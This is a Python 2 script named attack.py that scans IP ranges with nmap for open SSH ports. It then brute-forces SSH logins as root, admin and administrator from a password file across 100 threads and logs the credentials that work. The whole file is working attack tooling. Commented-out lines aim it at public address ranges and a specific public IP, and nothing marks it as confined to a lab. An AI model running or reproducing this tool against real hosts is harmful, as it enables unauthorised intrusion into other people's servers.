#!env python
#coding=utf-8
#
# Author:       liaoxinxi@nsfocus.com
#
# Created Time: 2011年07月29日 星期五 10时34分54秒
#
# FileName:     attack.py
#
# Description:
#
# ChangeLog:
import os
import pexpect
import re
import threading
import commands
import socket
import libssh2

_DEBUG=False

def my_print(msg):
    if _DEBUG:
        print (msg)

PASSWORD_RE = re.compile(r'[Pp]assword\s*:[ ]*|\xbf\xda\xc1\xee|口令|SecurID CODE:|密码|\xc3\xdc\xc2\xeb|Password for\s+\w+:', re.I)

def get_info():
    """get username and password from dict.txt"""
    #print "start to get_info\n"
    try:
        mydict = file("pass_file","r")
        string_list=[]
        stringline=[]
        for line in mydict:
            stringline=line.split()
            string_list.append(stringline)
        return string_list
    except:
        print "无该文件"
    mydict.close()

def get_passwords(file_name):
    """获取常用的密码"""
    try:
        passwords = []
        with open(file_name, 'r') as fd:
            for line in fd:
                if line.strip():
                    #passwords.append(line.strip().split()[1])
                    passwords.append(line.strip())
    except Exception,e:
        print "cannot open the file %s" % e

    return passwords


def find_target(ip_range):
    """根据ip范围（例10.16.0.*）得到开通ssh服务的主机ip列表"""
    cmd = "nmap -P0 "+ ip_range +" -p 22 -open|grep open -B 3"
    ips = []
    ip_str = commands.getoutput(cmd)
    ips = re.findall("\d+\.\d+\.\d+\.\d+",ip_str)
    with open(ip_range+".txt", 'w') as fd:
        fd.writelines(ips)
    my_print(ips)
    return ips

def login_test(ip):
    print "ip:", ip
    #probe_ips=find_target(ip_range)
#    passwords = get_passwords("password.100")
    passwords = get_passwords("global.password")
    users = ['root', 'admin', 'administrator']
    if _DEBUG==True:
        import pdb
        pdb.set_trace()
#    for i in range(len(userinfo_list)):
    first_password_attempt = False
    second_password_attempt = False
    passwords_len = len(passwords)
    if passwords_len % 3 != 0:#去掉最后不与3整除部分
        passwords_len = passwords_len - passwords_len % 3
    for i in range(0, passwords_len, 3):
        for user in users:
            first_password_attempt = False
            second_password_attempt = False
            spawn_string = "/usr/bin/ssh -x %s@%s" %(user, ip)
       #     print spawn_string
            #global child,mutex
            #mutex.acquire()
            child = pexpect.spawn(spawn_string)
            string_permission="Permission denied\w*"
            while True:
                try:
                    index = child.expect([string_permission,'(yes/no)', PASSWORD_RE, '.*#|.*\$|.*->'])
                    if index == 0:
                        break
                    elif index == 1:
                        child.sendline('yes')

                    elif index == 2:
                        if not first_password_attempt and not second_password_attempt:
                            child.sendline(passwords[i])
                            first_password_attempt = True
                        elif not second_password_attempt:
                            child.sendline(passwords[i+1])
                            second_password_attempt = True
                        else:
                            child.sendline(passwords[i+2])

                    elif index == 3:
                        with open("login.ok." + ip, 'a+') as fd:
                            if first_password_attempt and not second_password_attempt:
                                fd.write("login %s@%s succeed with %s\n" %(user, ip, passwords[i]))
                            elif first_password_attempt and second_password_attempt:
                                fd.write("login %s@%s succeed with %s\n" %(user, ip, passwords[i+1]))
                            else:
                                fd.write("login %s@%s succeed with %s\n" %(user, ip, passwords[i+2]))
                        #print "login %s@%s succeed with %s\n" %(user, ip, password)
                        child.sendline('exit')
                        break
                except pexpect.EOF:
                    #print "链接断开"
                    child.sendcontrol('c')
                except pexpect.TIMEOUT:
                    child.sendcontrol('c')
#                    import traceback
#                    traceback.print_exc()
                    #print "time out"
            #mutex.release()

def libssh2_login(ip):
    print "ip:", ip
    #probe_ips=find_target(ip_range)
#    passwords = get_passwords("password.100")
    passwords = get_passwords("global.password")
#    passwords = ['root', 'nsfocus']
    users = ['root', 'admin', 'administrator']

    for password in passwords:
        for user in users:
            my_print((user, password))
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, 22))
                sock.setblocking(1)
            #    sock.settimeout(None)
            except Exception, e:
                print e
            try:
                session = libssh2.Session()
                session.set_banner()
                session.startup(sock)
                my_print(session.last_error())
                session.userauth_password(user, password)
                my_print(session.last_error())
                channel = session.open_session()
                rc = channel.execute('uname -a')
                result = ''
                while True:
                    data = channel.read()
                    if not data:
                        break
                    result = result + data
                my_print(rc)
            #    channel.close()
                if not rc and (result.lower().find('aix') or result.lower().find('linux') \
                        or result.lower().find('hp-ux') or result.lower().find('solaris')):
                    print "ok---------------------------------------"
                    with open("login.ok" + ip, 'w') as fd:
                        fd.write('login %s ok with user:%s password:%s' %(ip, user, password))
            except Exception, e:
                my_print(e)
                pass


class MyThread(threading.Thread):

    def __init__(self,id,ips,thread_num):
        threading.Thread.__init__(self)
        self.id = id
        self.ips = ips
        self.thread_num = thread_num

    def run(self):
        iplist_len = len(self.ips)
        if iplist_len%self.thread_num == 0:#整除的处理
            range_num = iplist_len/self.thread_num
        else:
            range_num = iplist_len//self.thread_num + 1#长度除以线程数，每个线程分配的ip
        #print range_num
        for i in range(range_num):
            try:
                if range_num*self.id + i < iplist_len:  #超出iplist的就不操作了
                    print self.ips[range_num*self.id+i]
#                    login_test(self.ips[range_num*self.id + i])
                    libssh2_login(self.ips[range_num*self.id + i])
            except :
                import traceback
                traceback.print_exc()
                print "run() error"

if __name__ == "__main__":
    #print "start..............."
#    ips = find_target("218.144.*.*")
#    libssh2_login('63.149.230.225')
#    libssh2_login('10.20.60.18')
#    import sys
#    sys.exit()
#    fd = open('live_host.txt', 'r')
#    ips = fd.readline().split(", ")
#    ips = [ip.strip("'") for ip in ips]
    #print ips
#    ips = find_target("10.20.60.*")
#    print "".join(ips)
    #ips=['10.16.105.2']
    ips = open('218_144.txt', 'r').readlines()
    threadlist = []
    thread_number = 100
    global mutex
    mutex=threading.Lock()
    print "go to create thread..............."
    for i in range(thread_number):
        t = MyThread(i, ips, thread_number)
        threadlist.append(t)
    print "create ok!!!!!!!!"
    for i in range(thread_number):
        threadlist[i].start()
    print "thread start ok "
    for i in range(thread_number):
        threadlist[i].join()
    print "over!!!!!!!!!!!!!!!!!!!"








